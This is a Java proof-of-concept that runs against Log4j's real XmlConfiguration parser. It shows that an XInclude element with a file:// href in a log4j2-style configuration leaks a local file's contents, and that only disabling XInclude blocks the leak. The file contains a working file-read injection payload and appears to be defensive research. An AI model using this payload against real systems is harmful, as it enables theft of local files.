package org.apache.logging.log4j.core.config.xml;

// Deliberately in the real org.apache.logging.log4j.core.config.xml package:
// XmlConfiguration.newDocumentBuilder() is package-private, and the point of
// this proof is to call the REAL method, not a copy of its logic -- same
// rationale as XxeRealSourceProof in this directory.

import java.io.File;
import java.io.FileWriter;
import java.io.StringReader;
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import org.xml.sax.InputSource;

/**
 * XmlConfiguration.newDocumentBuilder(true) hardens against classic DTD-based
 * XXE (see XxeRealSourceProof), but XInclude is a separate JAXP mechanism
 * that hardening does not touch, and it is enabled unconditionally
 * (newDocumentBuilder(true) is the only call site, always passing true). This
 * proves that gap is real, not theoretical, and that the "obvious" fix
 * (FEATURE_SECURE_PROCESSING) does not close it either -- found empirically
 * while investigating, not assumed from documentation.
 */
class XIncludeRealSourceProof {

    private static int failed = 0;
    private static final String CANARY = "CANARY-xinclude-7f3a-do-not-leak";

    public static void main(String[] args) throws Exception {
        System.out.println("=== XInclude: proof through the REAL Log4j source ===\n");

        File secret = File.createTempFile("xinclude-real-proof-secret", ".txt");
        secret.deleteOnExit();
        try (FileWriter w = new FileWriter(secret)) {
            w.write(CANARY);
        }

        // The exact shape XmlConfiguration's constructor parses: a
        // log4j2.xml-style document, but with an <xi:include> pointing at a
        // local file unrelated to logging configuration.
        String xml = "<?xml version=\"1.0\"?>\n"
                + "<Configuration xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n"
                + "  <leaked><xi:include href=\"file://" + secret.getAbsolutePath()
                + "\" parse=\"text\"/></leaked>\n"
                + "</Configuration>";

        realXmlConfigurationLeaksTheFile(xml);
        secureProcessingDoesNotHelp(xml);
        disablingXIncludeIsTheOnlyFixThatWorked(xml);

        System.out.println();
        if (failed > 0) {
            System.out.println(failed + " check(s) FAILED");
            System.exit(1);
        }
        System.out.println("All checks passed.");
    }

    /** Calls the REAL XmlConfiguration.newDocumentBuilder(true), unmodified. */
    private static void realXmlConfigurationLeaksTheFile(String xml) throws Exception {
        DocumentBuilder builder = XmlConfiguration.newDocumentBuilder(true);
        String leaked = leakedText(builder, xml);
        assertTrue("the real DocumentBuilder XmlConfiguration's constructor uses reads a local "
                + "file's real contents via <xi:include> -- \"" + leaked + "\"",
                leaked.contains(CANARY));
    }

    /**
     * FEATURE_SECURE_PROCESSING is often assumed to be a blanket XML-safety
     * switch. It is not, for this specific mechanism -- confirmed here rather
     * than asserted from documentation.
     */
    private static void secureProcessingDoesNotHelp(String xml) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setNamespaceAware(true);
        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        factory.setXIncludeAware(true);
        String leaked = leakedText(factory.newDocumentBuilder(), xml);
        assertTrue("FEATURE_SECURE_PROCESSING=true did NOT block the same leak -- still \""
                + leaked + "\" -- this is not a safe substitute for disabling XInclude",
                leaked.contains(CANARY));
    }

    /** The only mitigation confirmed to work in this session's testing. */
    private static void disablingXIncludeIsTheOnlyFixThatWorked(String xml) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setNamespaceAware(true);
        factory.setXIncludeAware(false);
        String leaked = leakedText(factory.newDocumentBuilder(), xml);
        assertTrue("setXIncludeAware(false) blocks the leak -- text content is now \"" + leaked + "\"",
                !leaked.contains(CANARY));
    }

    private static String leakedText(DocumentBuilder builder, String xml) throws Exception {
        Document doc = builder.parse(new InputSource(new StringReader(xml)));
        return doc.getDocumentElement()
                .getElementsByTagName("leaked")
                .item(0)
                .getTextContent();
    }

    private static void assertTrue(String what, boolean ok) {
        if (ok) {
            System.out.println("  [PASS] " + what);
        } else {
            failed++;
            System.out.println("  [FAIL] " + what);
        }
    }
}
